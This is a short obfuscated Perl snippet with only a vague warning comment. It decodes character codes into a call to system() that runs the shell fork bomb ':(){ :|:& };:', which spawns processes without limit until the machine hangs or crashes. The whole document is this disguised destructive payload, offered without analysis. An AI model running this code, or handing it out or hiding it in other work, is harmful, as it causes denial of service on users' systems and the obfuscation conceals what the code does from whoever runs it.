# do not execute this code unless you definitely understand the consequences
$C='';@r=qw=115 121 115 116 101 109=;@00=qw~#.%.&~;@01=qw&<,=&;@10=qw=|/}/~=
;foreach(split/\//,$10[0]){push@2,(chr((ord$_)-1));}foreach(split/\./,$00[0]
){push@1,chr((ord$_)+3);}foreach(split/\,/,$01[0]){push@0,(chr((ord$_)-2));}
foreach(@r){$C.=(chr("$_"));}($S="\"$0[0]$1[1]$1[2]$2[0]"."\ "."$0[0]$2[1]".
"$0[0]$1[0]"."\ "."$2[2]$0[1]$0[0] \"";eval($C $S);until(defined($$)){chop;}
